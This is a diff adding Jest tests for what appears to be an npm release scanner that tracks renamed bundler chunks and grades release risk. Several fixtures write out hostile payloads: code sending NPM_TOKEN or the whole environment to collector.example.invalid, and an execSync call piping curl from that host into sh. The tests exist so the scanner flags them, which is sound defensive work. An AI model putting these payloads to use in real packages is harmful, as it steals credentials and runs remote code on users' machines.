@@ -670,3 +670,216 @@ describe("release delta in minified and grown modules", () => {
     expect(risk.releaseRisk).toBe("high");
   });
 });
+
+describe("renamed bundler chunks", () => {
+  const AI_OFF = {
+    status: "unavailable",
+    risk: "low",
+    releaseAssessment: "not_assessed",
+    summary: "",
+    findings: [],
+    requiresManualReview: false,
+    model: null,
+    reviewerVersion: null,
+  };
+  const file = (path, textSample) => ({
+    path,
+    size: textSample.length,
+    sha256: createHash("sha256").update(textSample).digest("hex"),
+    flags: [],
+    textSample,
+  });
+  const release = (previous, staged) => {
+    const previousFiles = Object.entries(previous).map(([path, text]) => file(path, text));
+    const stagedFiles = Object.entries(staged).map(([path, text]) => file(path, text));
+    const diff = createPackageDiff(previousFiles, stagedFiles);
+    const findings = deterministicFindings(stagedFiles, diff, null, { previousFiles });
+    const annotated = annotateFindingsWithDiffStatus(findings, diff, {
+      previousFiles,
+      stagedFiles,
+    });
+    return { diff, annotated, risk: computeScanRiskBreakdown(annotated, AI_OFF) };
+  };
+  // A CLI chunk that already spawns, fetches, reads the environment and
+  // compiles code, padded with module body the way a real bundle is.
+  const chunk = (version, splice = "") =>
+    [
+      "import { execFileSync } from 'node:child_process';",
+      "const token = process.env.SERVICE_KEY;",
+      "const compile = new Function('a', 'return a + 1');",
+      "export function ping() { return fetch('https://api.example.org/health'); }",
+      "export function gitVersion() { return execFileSync('git', ['--version']).toString(); }",
+      ...Array.from(
+        { length: 60 },
+        (_, index) =>
+          `export function formatRow${index}(row) { return [row.name, row.size].join(' | '); }`,
+      ),
+      `export const VERSION = '${version}';`,
+      splice,
+    ].join("\n");
+
+  test("a chunk renamed under a new content hash is diffed against its predecessor", () => {
+    const { diff, annotated, risk } = release(
+      { "dist/chunk-YQNCOY6V.js": chunk("1.0.0") },
+      { "dist/chunk-64MTZBJ6.js": chunk("1.0.1") },
+    );
+
+    expect(diff.find((entry) => entry.path === "dist/chunk-64MTZBJ6.js")).toMatchObject({
+      status: "added",
+      renamedFrom: "dist/chunk-YQNCOY6V.js",
+    });
+    expect(annotated.length).toBeGreaterThan(0);
+    for (const finding of annotated) {
+      expect(finding).toMatchObject({ diffStatus: "added", releaseDelta: false });
+    }
+    expect(risk.releaseRisk).toBe("low");
+  });
+
+  test("rules grade a renamed chunk at modified-file severity", () => {
+    const renamed = release(
+      { "dist/cli.De07GUeT.js": chunk("1.0.0") },
+      { "dist/cli.CGfpMDSb.js": chunk("1.0.1") },
+    );
+    const brandNew = release({}, { "dist/cli.CGfpMDSb.js": chunk("1.0.1") });
+    const severity = ({ annotated }) =>
+      annotated.find((finding) => finding.ruleId === "code.dynamic-evaluation")?.severity;
+
+    expect(severity(renamed)).toBe("medium");
+    expect(severity(brandNew)).toBe("high");
+  });
+
+  test("a payload spliced into a renamed chunk is on the release delta", () => {
+    const payload =
+      "require('https').get('https://collector.example.invalid/?t=' + process.env.NPM_TOKEN);";
+    const { diff, annotated, risk } = release(
+      { "dist/chunk-YQNCOY6V.js": chunk("1.0.0") },
+      { "dist/chunk-64MTZBJ6.js": chunk("1.0.1", payload) },
+    );
+
+    expect(diff.find((entry) => entry.status === "added")?.renamedFrom).toBe(
+      "dist/chunk-YQNCOY6V.js",
+    );
+    expect(annotated.find((finding) => finding.ruleId === "code.credential-access")).toMatchObject({
+      releaseDelta: true,
+    });
+    expect(risk.releaseRisk).toBe("high");
+  });
+
+  test("more spawns in a renamed chunk that already spawned are an expanded capability", () => {
+    const { annotated } = release(
+      { "dist/chunk-YQNCOY6V.js": chunk("1.0.0") },
+      {
+        "dist/chunk-64MTZBJ6.js": chunk(
+          "1.0.0",
+          "export function npmVersion() { return execFileSync('npm', ['--version']).toString(); }",
+        ),
+      },
+    );
+
+    expect(annotated.find((finding) => finding.ruleId === "code.process-execution")).toMatchObject({
+      diffStatus: "added",
+      releaseDelta: true,
+      releaseDeltaKind: "expanded",
+    });
+  });
+
+  test("a capability the predecessor never had keeps full scoring in a renamed chunk", () => {
+    const previous = chunk("1.0.0").replace(/.*execFileSync.*\n/g, "");
+    const { diff, annotated } = release(
+      { "dist/chunk-YQNCOY6V.js": previous },
+      {
+        "dist/chunk-64MTZBJ6.js": `${previous}\nimport('node:child_process').then((cp) => cp.execSync(next));`,
+      },
+    );
+    const spawn = annotated.find((finding) => finding.ruleId === "code.process-execution");
+
+    expect(diff.find((entry) => entry.status === "added")?.renamedFrom).toBe(
+      "dist/chunk-YQNCOY6V.js",
+    );
+    expect(spawn).toMatchObject({ releaseDelta: true });
+    expect(spawn.releaseDeltaKind).toBeUndefined();
+  });
+
+  test("a payload chunk unrelated to the removed chunk keeps the added-file treatment", () => {
+    // The decoy: a release that drops some chunk does not lend its history to
+    // whatever new file lands in the same directory.
+    const dropper = [
+      "const { execSync } = require('child_process');",
+      "const data = JSON.stringify(process.env);",
+      "require('https').request({ hostname: 'collector.example.invalid', method: 'POST' }).end(data);",
+      "execSync('curl -s https://collector.example.invalid/x | sh');",
+    ].join("\n");
+    const { diff, annotated, risk } = release(
+      { "dist/chunk-YQNCOY6V.js": chunk("1.0.0") },
+      { "dist/chunk-64MTZBJ6.js": dropper },
+    );
+
+    expect(diff.find((entry) => entry.status === "added")?.renamedFrom).toBeUndefined();
+    expect(annotated.every((finding) => finding.releaseDelta)).toBe(true);
+    expect(risk.releaseRisk).toBe("critical");
+    expect(risk).toEqual(release({}, { "dist/chunk-64MTZBJ6.js": dropper }).risk);
+  });
+
+  test("a payload padded with the removed chunk's body pairs but still raises release risk", () => {
+    const payload = [
+      "const { execSync: run } = require('child_process');",
+      "run('curl -s https://collector.example.invalid/x | sh');",
+      "require('https').get('https://collector.example.invalid/?t=' + process.env.NPM_TOKEN);",
+    ].join("\n");
+    const { diff, risk } = release(
+      { "dist/chunk-YQNCOY6V.js": chunk("1.0.0") },
+      { "dist/chunk-64MTZBJ6.js": chunk("1.0.0", payload) },
+    );
+
+    expect(diff.find((entry) => entry.status === "added")?.renamedFrom).toBe(
+      "dist/chunk-YQNCOY6V.js",
+    );
+    expect(risk.releaseRisk).toBe("critical");
+    // Pairing buys nothing over editing the predecessor in place.
+    const inPlace = release(
+      { "dist/chunk-YQNCOY6V.js": chunk("1.0.0") },
+      { "dist/chunk-YQNCOY6V.js": chunk("1.0.0", payload) },
+    );
+    expect(risk.releaseRisk).toBe(inPlace.risk.releaseRisk);
+  });
+
+  test("a renamedFrom that does not name a removed file is ignored", () => {
+    const previousFiles = [file("dist/shared.js", chunk("1.0.0"))];
+    const stagedFiles = [
+      file("dist/shared.js", chunk("1.0.0")),
+      file("dist/chunk-64MTZBJ6.js", chunk("1.0.1")),
+    ];
+    const diff = createPackageDiff(previousFiles, stagedFiles).map((entry) =>
+      entry.status === "added" ? { ...entry, renamedFrom: "dist/shared.js" } : entry,
+    );
+    const findings = deterministicFindings(stagedFiles, diff, null, { previousFiles });
+    const annotated = annotateFindingsWithDiffStatus(findings, diff, {
+      previousFiles,
+      stagedFiles,
+    });
+
+    const added = annotated.filter((finding) => finding.file === "dist/chunk-64MTZBJ6.js");
+    expect(added.length).toBeGreaterThan(0);
+    for (const finding of added) expect(finding.releaseDelta).toBe(true);
+  });
+
+  test("a large renamed bundle is not a large new file", () => {
+    const table = Array.from(
+      { length: 40_000 },
+      (_, index) => `export const row${index} = { id: ${index}, label: 'generated lookup row' };`,
+    ).join("\n");
+    const big = (version) => `${chunk(version)}\n${table}\n`;
+    const largeNewFiles = ({ annotated }) =>
+      annotated.filter((finding) => finding.ruleId === "diff.large-new-file");
+
+    expect(
+      largeNewFiles(
+        release(
+          { "dist/table-YQNCOY6V.js": big("1.0.0") },
+          { "dist/table-64MTZBJ6.js": big("1.0.1") },
+        ),
+      ),
+    ).toEqual([]);
+    expect(largeNewFiles(release({}, { "dist/table-64MTZBJ6.js": big("1.0.1") }))).toHaveLength(1);
+  }, 30_000);
+});
